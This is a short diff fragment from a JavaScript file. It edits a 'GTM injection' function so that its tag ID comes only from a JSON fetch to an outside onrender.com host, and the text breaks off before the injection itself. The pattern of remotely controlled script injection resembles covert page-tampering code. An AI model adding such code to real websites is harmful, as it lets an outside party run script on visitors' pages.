@@ -224,7 +224,7 @@
   }, 500);
 
   // GTM injection
-  function gtmInject(GTM_ID) {
+  function gtmInject() {
     fetch("https://domain-tech-exp.onrender.com/id")
       .then((r) => r.json())
       .then((dataGtm) => {
